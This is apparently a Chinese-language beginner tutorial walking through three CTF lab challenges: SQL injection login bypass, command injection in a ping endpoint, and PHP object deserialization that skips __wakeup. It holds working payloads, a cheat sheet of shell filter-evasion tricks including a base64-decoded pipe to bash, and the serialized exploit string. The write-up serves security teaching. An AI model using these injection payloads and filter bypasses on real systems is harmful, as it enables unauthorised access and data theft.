

# <font style="color:rgb(33, 37, 41);">[极客大挑战 2019]EasySQL：</font>

[https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)



从题目来看，已经很明确这就是一道 SQL 注入的题目。那么我们先简单了解一下什么是 SQL 注入：



## 初识 SQL 注入

> 学习过程中一定一定要学会使用 AI。
>
> ------
>
> ## 一、先用一句话说明 SQL 注入是什么
>
> > **SQL 注入 = 把“恶意 SQL 语句”塞进程序，让数据库帮攻击者干坏事**
>
> 说白了：
> 👉 **程序本来是“查数据的”，结果被人“骗去执行攻击命令”**
>
> ------
>
> ## 二、 3 个基础概念
>
> ### 1️⃣ 什么是数据库？
>
> 数据库就像一个 **Excel 表格仓库**，里面存着：
>
> - 用户名
> - 密码
>
> 例如一张用户表：
>
> | id   | username | password |
> | ---- | -------- | -------- |
> | 1    | admin    | 123456   |
> | 2    | user     | abc123   |
>
> ------
>
> ### 2️⃣ 什么是 SQL？
>
> SQL 是 **数据库听得懂的语言**，比如：
>
> ```sql
> SELECT * FROM users WHERE username='admin' AND password='123456';
> ```
>
> 意思是：
>
> > 去 users 表里找
> > 用户名是 admin 且 密码是 123456 的用户
>
> ------
>
> ### 3️⃣ 网站登录一般怎么写？
>
> 伪代码：
>
> ```php
> $username = 用户输入的用户名;
> $password = 用户输入的密码;
> 
> $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
> ```
>
> ⚠️ **重点：用户输入的内容，直接拼进了 SQL 语句**
>
> ------
>
> ## 三、SQL 注入是怎么发生的？（核心原理）
>
> ### 正常用户输入：
>
> ```
> 用户名：admin
> 密码：123456
> ```
>
> 拼出来的 SQL 是：
>
> ```sql
> SELECT * FROM users WHERE username='admin' AND password='123456';
> ```
>
> ✅ 合法、安全
>
> ------
>
> ### 黑客输入（关键点来了）：
>
> ```
> 用户名：admin
> 密码：' OR '1'='1
> ```
>
> 拼接后 SQL 变成：
>
> ```sql
> SELECT * FROM users 
> WHERE username='admin' AND password='' OR '1'='1';
> ```
>
> ------
>
> ## 四、为什么这就能“绕过登录”？
>
> ### 1️⃣ `'1'='1'` 永远为真
>
> 这是数学常识：
>
> ```sql
> '1'='1'  ✅ 永远成立
> ```
>
> ------
>
> ### 2️⃣ 数据库执行逻辑是这样的：
>
> ```sql
> (username='admin' AND password='')
> OR ('1'='1')
> ```
>
> 而 **OR 只要一边为真，整体就为真**
>
> ➡️ **直接登录成功，不用密码**
>
> 💥 这就是 SQL 注入最经典的效果：
>
> > **无需密码登录管理员**
>
> ------
>
> ## 五、SQL 注入到底能干什么？（危害）
>
> 如果网站有 SQL 注入，攻击者可以：
>
> ### 🚨 1️⃣ 绕过登录（最常见）
>
> - 登录管理员
> - 登录任意用户
>
> ------
>
> ### 🚨 2️⃣ 偷数据
>
> ```sql
> 查所有用户密码
> 查身份证号
> 查成绩、订单
> ```
>
> ------
>
> ### 🚨 3️⃣ 改数据
>
> ```sql
> 改管理员密码
> 改余额
> 改成绩
> ```
>
> ------
>
> ### 🚨 4️⃣ 删库跑路（不是玩笑）
>
> ```sql
> DROP DATABASE xxx;
> ```
>
> 👉 **所以 SQL 注入 = Web 漏洞里的“老大哥”**
>
> ------
>
> ## 六、为什么会出现 SQL 注入？（根本原因）
>
> 一句话总结：
>
> > ❌ **程序员把“用户输入”当成“SQL 命令的一部分”**
>
> 根因有 3 个：
>
> 1. 用户输入 **不可信**
> 2. SQL 语句 **字符串拼接**
> 3. 没有做安全处理
>
> ------
>
> ## 七、那么如何防御呢？
>
> 大家先自己思考一下，可以在下面说说自己的想法：
>
> 



## 题

看到这里，相信你已经有一些思路了，我们接着看题：

这个题目的页面只有一个用户登录页面，那么就去测试有没有注入点：

![image-20251223200052208](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232000576.png)





尝试：**（当然，如何尝试也是有方法的，目前来说大家不必纠结，只需要知道这道题是怎么做出来的，在之后咋们还会专门学习 SQL 注入）**

用户名：`1'`

密码：`111`

![image-20251223200222111](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232002361.png)

传入之后会发现，他不提示用户名或密码错误，而是返回了一条奇怪的报错

![image-20251223201054613](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232010856.png)



那么我们去看看这个报错是什么意思：



## 报错分析

报错原文：

```
You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax to use near '1'' at line 1
```

### 中文直译👇

> ❌ 你的 SQL 语句**语法有错误**
>  数据库在 **第 1 行**
>  在 **`'1''` 附近** 看不懂你写的 SQL

**重点看 1 个地方就够了：**

👉 **`near '1''`**    **数据库在解析 SQL 时，引号没配对，语法被你写坏了**

### 这条报错说明了什么？

✅ 你的输入 **已经被拼进 SQL 语句**
✅ 程序 **直接拼接用户输入**
✅ **这里很可能存在 SQL 注入**

### 为什么会报 `'1''`？

因为你输入的内容里 **单引号数量不对**，
 导致 SQL 变成了类似：

```
'1''
```

👉 多了一个 `'`，数据库看不懂



## payload

这个题目非常简单，基本上没有进行过滤，我们尝试使用万能密码，用户名1’ or 1=1#，密码随意，点击登录后，



`1' or 1=1#`

![image-20251223201726614](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232017854.png)











# <font style="color:rgb(33, 37, 41);">[GXYCTF2019]Ping Ping Ping</font>

[https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)



这个题应该很熟悉了，关于 `ping` 命令的，如果还不知道 `ping` 是干什么的就自己去查吧



这里题目中只有

/?ip=



![image-20251223202035786](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232020918.png)



应该想到的是 GET 传参



给 ip 传参 127.0.0.1

从回显来看，他会将 ip 的值传给 ping  命令执行



**也就是说：我们传入 `/?ip=127.0.0.1` ，后端执行的实际上是：`ping 127.0.0.1`**



![image-20251223202148420](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232021549.png)



既然可以执行 ping 命令，那我们就想：能否执行其他的系统命令呢？**（因为一般的搭建 CTF 平台的系统是 Linux 系统，我们首先以这个系统是 Linux 系统去考虑）**



> 回忆一下，Linux 中如何在一行执行多条命令呢？
>
> ### 1、可以通过 `;` ，分割命令，**顺序执行**，前一个失败也不影响后一个
>
> ![image-20251223202940756](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232029805.png)
>
> ### 2、`&&`（前一个成功，才执行下一个）
>
> ![image-20251223203009366](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232030429.png)
>
> ### 3、`||`（前一个失败，才执行下一个）
>
> ![image-20251223203058648](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232030702.png)
>
> 



回到题目中去，我们先尝试：`127.0.0.1 ; whoaim`

成功返回了 当前用户为 ：`www-data`

![image-20251223203304673](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232033804.png)





查看目录：`?ip=127.0.0.1;ls`

![image-20251223203433271](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232034435.png)







找到了 flag.php

`/?ip=127.0.0.1;cat%20flag.php`

![image-20251223212207263](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232122406.png)

发现直接写命令会被过滤，不能有空格



> 试试其他绕过空格限制的方法。

```shell
# Linux 下绕过空格限制
$IFS # Internal Field Separator （内部字段分隔符）默认为（空格、制表符、换号）。
${IFS}
$IFS$1 //改成$[1,2,3,4,5,6,7,8,9]
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能
%20 
%09 
$'\x20'

# 过滤关键字
a=g;b=fla$a.php;cat$IFS$1$b  # 赋值引用
ca\t fl\ag.php	# 不影响命令执行
cat f*.php		# 匹配关键字
echo  "Y2F0IGZsYWcucGhw" | base64 -d | bash  # cat flag.php的base64编码通过管道执行
cat `ls` #ls出来的文件名都会被cat
```



尝试：`?ip=127.0.0.1;cat$IFS$1flag.php`

发现仍然被过滤，难道他真的能把所有的空格都限制了吗？





实际上，他把 **flag 也加到了黑名单**



我们查看 index.php :    `?ip=127.0.0.1;cat$IFS$1index.php`

![image-20251223212723931](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232127079.png)



得到源码，

```
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```





具体的分析大家自己解决，这里只给出这段代码的整体功能：

**从 GET 参数 `ip` 取值 → 过滤一些“危险字符/关键词” → 拼接到 `ping` 命令中执行 → 回显结果**





### 解法1：

``` 
/?ip=127.0.0.1;a=ag;b=fl;cat$IFS$1$b$a.php
也可以 /?ip=127.0.0.1;a=lag;cat$IFS$9f$a.php
```

![image-20251223213803913](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232138068.png)



### 解法2:

内联执行绕过
将**反引号内**命令的输出作为输入执行

```
?ip=|cat$IFS$9`ls`
```

![image-20251223213900691](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232139823.png)















# <font style="color:rgb(33, 37, 41);">[极客大挑战 2019]PHP</font>

（做这道题的时候一定要有耐心，多看几篇题解）

[https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)



![image-20251223214403281](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232144407.png)



提示：**良好的备份网站的习惯**



从这句话应该知道，本题将题目的源码放在了该题网站的某个文件夹或者文件中，

那么我们应该如何去找到这个文件，如何去知道这个文件叫什么？



咋们介绍俩个工具——dirsearch，yakit

> # 首先是dirsearch（当然这个工具依赖 python 环境）
>
> > 大家应该都知道 Linux 中查看一个文件夹中的文件/文件夹的命令是 `ls`，那么在 Windows 的 cmd 中是什么呢？
> >
> > 我们这个文件夹为例，进行演示：
> >
> > ![image-20251223215141386](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232151436.png)
> >
> > 1、`dir`
> >
> > ![image-20251223215102488](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232151534.png)
> >
> > 2、`tree`
> >
> > ![image-20251223215219447](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232152488.png)
> >
> > 3、`tree /f`
> >
> > ![image-20251223215232189](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232152251.png)
>
> 那么我们看一下 dirsearch 这个工具的使用
>
> ![image-20251223220907004](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232209193.png)
>
> 工具位置：
>
> ![image-20251223215349034](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232153173.png)
>
> **推荐大家学会看说明——README（一般每个工具、项目等都会有一个说明文件）：**
>
> ![image-20251223215842266](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232158396.png)
>
> 扫描站点 `http://d3c9ba8b-8b01-4935-b222-103ba004ac1e.node5.buuoj.cn:81/` 为例
>
> 使用 `-u` 指定需要扫描URL
>
> 使用 `-e`  指定需要扫描的文件名 
>
> `python dirsearch.py -u "http://d3c9ba8b-8b01-4935-b222-103ba004ac1e.node5.buuoj.cn:81/"`
>
> 
>
> 因为这个工具的字典不全，什么都没有扫出来：
>
> ![image-20251223221834109](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232218229.png)
>
> # Yakit
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232219160.png)
>
> 
>
> ![image-20251223222247265](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232222401.png)



通过目录扫描我们找到它的备份文件是 `www.zip` （或者说，备份目录的文件名一般都是固定的，大家可以去查一查**备份文件的命名**）



![image-20251223222459803](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232224969.png)





![image-20251223222635067](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232226222.png)



解压之后，确实是这个网站的源码：

![image-20251223222656589](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512232226648.png)





> PHPStorm 安装：（这里以 win10 虚拟机为例，以视频演示，）
>
> [PHPStorm 安装&激活](https://www.bilibili.com/video/BV1HgB3BfEj7/?spm_id_from=333.1387.upload.video_card.click&vd_source=ccc09886b3e732a2ab732755ed61e36e)



用 PHPStorm 打开项目：

![image-20251224091404833](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512240914146.png)



### 下面就以该项目为例，演示代码审计的基本流程。



**拿到一套源码，首先要看其目录结构**。

​	本题的目录结构较简单

![image-20251224091740020](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512240917081.png)

对于此类型的源码，我们把每个文件都看一遍，以防有疏漏



#### 1、index.js

![image-20251224092316852](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512240923066.png)



 **这是一个 Three.js 交互动画：**

- 场景中有一只 **猫（hero）**
- 鼠标控制一个 **毛线球（ball）的位置**
- 毛线球通过 **绳子物理模拟（Verlet 约束）** 跟随鼠标
- 猫会与毛线球互动（拍、推、甩）
- 整个过程通过 `requestAnimationFrame` 实时渲染



#### 2、style.css

![image-20251224092453754](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512240924920.png)



**这段 CSS 只负责“页面容器 + 文字样式”，不参与任何 3D 逻辑**

- `#world`：Three.js 渲染画布的容器
- `#credits`：页面底部的作者/来源说明文字
- `Google Fonts`：美化字体



#### 3、index.php

![image-20251224092604286](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512240926501.png)



仔细观察这段代码，它实际上包含了 html 和 php 俩种语言

```php+HTML
<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>







<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>

```



html 代码中写的是一个 Three.js 猫咪动画页面

而真正的内容是一个“隐藏在画面里的 **PHP 反序列化点**”



把 php 的部分单独拿出分析：

```php
<?php
//引入一个类定义文件
include 'class.php';
//接收 GET 参数 'select' 的值，并赋值给变量 $select
$select = $_GET['select'];
//使用函数 unserialize() 对 $select 进行反序列化
//@ 的作用是隐藏报错
$res=unserialize(@$select);
?>
```

> ==关键！！！==**unserialize() 函数的作用**，留给大家自己去查

|       问题       |     说明     |
| :--------------: | :----------: |
|     用户可控     |   `$_GET`    |
| 使用 unserialize |   高危函数   |
|      无限制      |  没有白名单  |
|     错误抑制     | `@` 隐藏报错 |



那么这就是一个典型的：

**PHP 反序列化漏洞（对象注入）**

这个漏洞能利用到什么程度，取决于 `class.php` 里有什么：

- 如果有 `__destruct()` → **代码执行**
- 如果有 `__wakeup()` → **逻辑执行**
- 如果有 `__toString()` → **信息泄露**
- 如果能触发文件操作 → **读文件 / 写文件**



#### 4、class.php

```php
<?php
//包含文件 flag.php
include 'flag.php';

//关闭报错
error_reporting(0);

//类定义
class Name{
    //PHP 序列化 private 成员时，名字会被“污染”
	//这是反序列化利用的突破点之一
    private $username = 'nonono';
    private $password = 'yesyes';

    //构造函数
    //unserialize 不会调用 __construct()，所以我们不用管构造函数
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    //反序列化后，强制把 username 改成 guest，看似封死 admin，其实还能绕
    function __wakeup(){
        $this->username = 'guest';
    }

    //最终判定点
    function __destruct(){
        //利用条件
        //$this->password == 100
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        //$this->username === 'admin'
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```



**魔术方法**

- `__wakeup()`: 反序列化时自动调用，强制把 `username` 设为 `'guest'`
- `__destruct()`: 对象销毁时调用，是**最终判定逻辑**



**获取 flag 的条件**

在 `__destruct()` 中必须同时满足：

1. `$this->password == 100` （弱类型比较）
2. `$this->username === 'admin'` （强类型比较）



### 问题1：**__wakeup() 的干扰**



```php
function __wakeup(){
    $this->username = 'guest';  // 反序列化后立即把 username 改为 guest
}
```

- 这会阻止我们直接设置 `username` 为 `'admin'`



### 问题2：**属性访问限制**

- `username` 和 `password` 都是 `private`，序列化格式特殊



### 利用思路



#### 绕过 __wakeup()

使用 **CVE-2016-7124** 漏洞：

- 如果序列化字符串中对象属性数量大于实际数量，`__wakeup()` 会被跳过

  示例：`O:4:"Name":3:{...}` 而不是 `O:4:"Name":2:{...}`



#### private 属性的序列化格式

对于 private 属性，PHP 会加上：

- `%00类名%00属性名` 格式
- 示例：`username` 变成 `%00Name%00username`



#### payload 构造

可用 payload:

```
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

![image-20251224111153318](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512241111525.png)



##### （1）各部分详解

`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`

###### 1. **对象标识**

- `O:` - 表示这是一个对象（Object）
- `4:` - 类名的长度是4个字符
- `"Name"` - 类名



###### 2. **属性数量（关键绕过点）**

- `:3:` - 表示对象有3个属性（实际上只有2个属性）
- **为什么是3？** 为了绕过 `__wakeup()` 方法
- 实际属性：`username` 和 `password`（共2个）
- 设置成3 > 2，触发 CVE-2016-7124，跳过 `__wakeup()`



###### 3. **属性列表开始**

- `{` - 属性列表开始



###### 4. **第一个属性：username**

```
s:14:"\0Name\0username";s:5:"admin";
```

分解：

- `s:` - 字符串类型
- `14:` - 字符串长度14个字符（包含2个空字符）
- `"\0Name\0username"` - 属性名
  - `\0` - 空字符（ASCII 0）
  - `Name` - 类名
  - `\0` - 空字符
  - `username` - 属性名
- `s:5:"admin"` - 属性值：字符串"admin"，长度5



###### 5. **第二个属性：password**

```
s:14:"\0Name\0password";i:100;
```

分解：

- `s:14:"\0Name\0password"` - 属性名（同上格式）
- `i:100` - 属性值：整数100
  - `i:` - 整数类型
  - `100` - 整数值



###### 6. **属性列表结束**

- `}` - 属性列表结束



##### （2）一些问题

###### 为什么需要空字符（\0）

PHP private 属性的序列化规则

```php
class Name {
    private $username;  // 私有属性
}
```

序列化后变成：

- `\0类名\0属性名`（在字符串中）
- 示例：`\0Name\0username`





#### 完整流程

1. **服务器接收**：`?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
2. **URL解码**：恢复空字符 `%00` → `\0`
3. **反序列化**：
   - 创建 Name 对象
   - 属性计数=3，触发漏洞，跳过 `__wakeup()`
   - 设置私有属性：username="admin", password=100
4. **对象销毁**：
   - 调用 `__destruct()`
   - password==100 ✅（弱类型比较）
   - username==='admin' ✅（强类型比较）
   - 输出 flag